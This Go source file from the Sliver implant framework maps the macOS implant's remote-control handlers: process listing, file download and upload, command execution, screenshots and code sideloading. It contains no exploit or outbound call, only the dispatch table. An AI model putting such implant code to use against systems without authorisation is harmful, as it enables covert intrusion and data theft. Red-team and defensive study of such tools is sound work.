package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Debug}}

	// {{else}}
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	darwinHandlers = map[uint32]RPCHandler{
		pb.MsgPsReq:        psHandler,
		pb.MsgTerminateReq: terminateHandler,
		pb.MsgPing:         pingHandler,
		pb.MsgLsReq:        dirListHandler,
		pb.MsgDownloadReq:  downloadHandler,
		pb.MsgUploadReq:    uploadHandler,
		pb.MsgCdReq:        cdHandler,
		pb.MsgPwdReq:       pwdHandler,
		pb.MsgRmReq:        rmHandler,
		pb.MsgMkdirReq:     mkdirHandler,
		pb.MsgIfconfigReq:  ifconfigHandler,
		pb.MsgExecuteReq:   executeHandler,
		sliverpb.MsgEnvReq: getEnvHandler,

		pb.MsgScreenshotReq: screenshotHandler,

		pb.MsgSideloadReq: sideloadHandler,
	}

	darwinPivotHandlers = map[uint32]PivotHandler{}
)

// GetSystemHandlers - Returns a map of the darwin system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return darwinHandlers
}

// GetSystemPivotHandlers - Returns a map of the darwin system handlers
func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return darwinPivotHandlers
}
